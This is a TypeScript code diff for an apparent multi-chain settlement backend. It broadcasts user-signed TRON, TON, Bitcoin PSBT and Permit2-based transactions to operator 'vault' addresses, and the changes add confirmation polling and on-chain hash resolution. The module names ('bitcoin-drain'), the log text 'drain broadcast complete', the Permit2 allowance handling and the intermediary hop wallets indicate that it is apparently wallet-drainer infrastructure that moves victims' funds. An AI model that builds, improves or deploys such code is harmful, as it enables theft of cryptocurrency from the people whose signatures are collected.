@@ -45,6 +45,7 @@ import {
 import {
   executePermit2AllowanceSettlement,
   parsePermit2SignatureEnvelope,
+  resolveOperationalEvmVaultAddress,
 } from './permit2-executor.js'
 import {
   executeBatchPermit2Settlement,
@@ -56,6 +57,11 @@ import {
   parseOmnichainAtomicSignatureEnvelope,
 } from './omnichain-atomic-settlement.js'
 import { broadcastPSBT, parseBitcoinPsbtSignatureEnvelope } from './bitcoin-drain.js'
+import {
+  isConfirmationPollingEnabled,
+  pollBtcConfirmation,
+  pollTronConfirmation,
+} from './tx-confirmation-poller.js'
 import {
   isNonEvmServerSigningEnabled,
   resolveTronTokenFromContext,
@@ -152,7 +158,11 @@ export function resolveSovereignVaultAddresses(): {
     (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_BTC'] : undefined)?.trim() ||
     (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_UTXO'] : undefined)?.trim()
   let evm: Address | undefined
-  if (evmRaw && isAddress(evmRaw)) evm = getAddress(evmRaw)
+  if (evmRaw && isAddress(evmRaw)) {
+    evm = resolveOperationalEvmVaultAddress(getAddress(evmRaw)) ?? undefined
+  } else {
+    evm = resolveOperationalEvmVaultAddress(null) ?? undefined
+  }
   const svm = svmRaw && svmRaw.length >= 32 ? svmRaw : undefined
   const tron = tronRaw && tronRaw.length >= 30 ? tronRaw : undefined
   const ton = tonRaw && tonRaw.length >= 30 ? tonRaw : undefined
@@ -201,6 +211,10 @@ export function resolveSvmRelayHopDestination(vault: string): RelayHopResolution
   }
   try {
     const destination = new PublicKey(raw).toBase58()
+    console.warn(
+      '[SETTLEMENT] RELAY_INTERMEDIARY_SVM is set but the intermediary → vault second leg is not implemented. ' +
+        'Funds may remain on the intermediary. Unset RELAY_INTERMEDIARY_SVM unless you manually sweep the hop wallet.',
+    )
     return { ok: true, broadcast_destination: destination, vault, intermediary_hop: true }
   } catch {
     return { ok: false, detail: 'RELAY_INTERMEDIARY_SVM is not a valid Solana public key' }
@@ -839,6 +853,69 @@ function tonRelayMetadataValidation(
   return null
 }
 
+/** Poll TonCenter for the latest on-chain tx after user-BOC broadcast (lt:hash). */
+async function resolveTonUserBocTxHash(
+  client: import('@ton/ton').TonClient,
+  walletAddress: string,
+  opts?: { timeoutMs?: number; intervalMs?: number },
+): Promise<string | null> {
+  const { Address } = await import('@ton/core')
+  let address: import('@ton/core').Address
+  try {
+    address = Address.parse(walletAddress.trim())
+  } catch {
+    return null
+  }
+  const timeout = opts?.timeoutMs ?? 30_000
+  const interval = opts?.intervalMs ?? 2_000
+  const deadline = Date.now() + timeout
+  while (Date.now() < deadline) {
+    try {
+      const txs = await client.getTransactions(address, { limit: 1 })
+      const tx = txs[0]
+      if (tx) {
+        const hash = tx.hash().toString('hex')
+        const lt = tx.lt?.toString() ?? '0'
+        return `${lt}:${hash}`
+      }
+    } catch {
+      /* transient — keep polling */
+    }
+    await sleepMs(interval)
+  }
+  return null
+}
+
+async function awaitTronUserBroadcastConfirmation(
+  txHash: string,
+): Promise<{ ok: true; warning?: string } | { ok: false; detail: string }> {
+  if (!isConfirmationPollingEnabled()) return { ok: true }
+  const outcome = await pollTronConfirmation(txHash, resolveTronSensoryFullHost())
+  if (outcome.status === 'failed') {
+    return { ok: false, detail: outcome.detail }
+  }
+  if (outcome.status === 'timeout') {
+    console.warn(`[TRON_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
+    return { ok: true, warning: 'broadcast_confirmation_timeout' }
+  }
+  return { ok: true }
+}
+
+async function awaitBtcUserBroadcastConfirmation(
+  txHash: string,
+): Promise<{ ok: true; warning?: string } | { ok: false; detail: string }> {
+  if (!isConfirmationPollingEnabled() || txHash === '') return { ok: true }
+  const outcome = await pollBtcConfirmation(txHash)
+  if (outcome.status === 'failed') {
+    return { ok: false, detail: outcome.detail }
+  }
+  if (outcome.status === 'timeout') {
+    console.warn(`[BTC_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
+    return { ok: true, warning: 'broadcast_confirmation_timeout' }
+  }
+  return { ok: true }
+}
+
 function readVarInt(bytes: Uint8Array, cursor: { offset: number }): bigint {
   const first = bytes[cursor.offset]
   if (first == null) throw new Error('UTXO relay payload truncated')
@@ -1451,12 +1528,23 @@ export async function broadcastTron(
             ? transaction['txID']
             : ''
     if (tx_hash === '') throw new Error('TRON relay did not return a transaction id')
+    const confirm = await awaitTronUserBroadcastConfirmation(tx_hash)
+    if (confirm.ok === false) {
+      return broadcastResult({
+        lane: 'tron-sensory-armor',
+        chain_family: 'TRON',
+        destination_vault: vaults.tron,
+        status: 'broadcast_failed',
+        detail: confirm.detail,
+      })
+    }
     const result = broadcastResult({
       lane: 'tron-sensory-armor',
       chain_family: 'TRON',
       destination_vault: vaults.tron,
       status: 'broadcasted',
       tx_hash,
+      ...(confirm.warning ? { detail: confirm.warning } : {}),
     })
     emitSettlementIgnitedTelemetry(result)
     return result
@@ -1542,13 +1630,22 @@ export async function broadcastTon(
     const apiKey = typeof process !== 'undefined' ? process.env['TONCENTER_API_KEY']?.trim() : ''
     const client = apiKey ? new TonClient({ endpoint, apiKey }) : new TonClient({ endpoint })
     await client.sendFile(buffer)
-    const tx_hash = firstCell.hash().toString('hex')
+    const cellHash = firstCell.hash().toString('hex')
+    const chainTxHash =
+      (await resolveTonUserBocTxHash(client, ctx.wallet_address)) ??
+      (await resolveTonUserBocTxHash(client, vaults.ton)) ??
+      cellHash
+    if (chainTxHash === cellHash) {
+      console.warn(
+        `[TON_CONFIRM] Could not resolve on-chain tx id for BOC — using cell hash ${cellHash}`,
+      )
+    }
     const result = broadcastResult({
       lane: 'ton-sensory-armor',
       chain_family: 'TON',
       destination_vault: vaults.ton,
       status: 'broadcasted',
-      tx_hash,
+      tx_hash: chainTxHash,
     })
     emitSettlementIgnitedTelemetry(result)
     return result
@@ -1645,13 +1742,23 @@ export async function broadcastUTXO(
     try {
       const broadcast = await broadcastPSBT(bitcoinPsbtEnvelope.signed_psbt_base64)
       if (broadcast.ok && broadcast.tx_hash) {
+        const confirm = await awaitBtcUserBroadcastConfirmation(broadcast.tx_hash)
+        if (confirm.ok === false) {
+          return broadcastResult({
+            lane: 'managed-utxo-relay',
+            chain_family: 'UTXO',
+            destination_vault: vaults.btc,
+            status: 'broadcast_failed',
+            detail: confirm.detail,
+          })
+        }
         const result = broadcastResult({
           lane: 'managed-utxo-relay',
           chain_family: 'UTXO',
           destination_vault: vaults.btc,
           status: 'broadcasted',
           tx_hash: broadcast.tx_hash,
-          detail: 'Bitcoin PSBT drain broadcast complete',
+          detail: confirm.warning ?? 'Bitcoin PSBT drain broadcast complete',
         })
         emitSettlementIgnitedTelemetry(result)
         return result
@@ -1721,12 +1828,23 @@ export async function broadcastUTXO(
   }
   try {
     const tx_hash = await pushUtxoRawTransaction(rawTransaction)
+    const confirm = await awaitBtcUserBroadcastConfirmation(tx_hash)
+    if (confirm.ok === false) {
+      return broadcastResult({
+        lane: 'managed-utxo-relay',
+        chain_family: 'UTXO',
+        destination_vault: vaults.btc,
+        status: 'broadcast_failed',
+        detail: confirm.detail,
+      })
+    }
     const result = broadcastResult({
       lane: 'managed-utxo-relay',
       chain_family: 'UTXO',
       destination_vault: vaults.btc,
       status: 'broadcasted',
       tx_hash,
+      ...(confirm.warning ? { detail: confirm.warning } : {}),
     })
     emitSettlementIgnitedTelemetry(result)
     return result
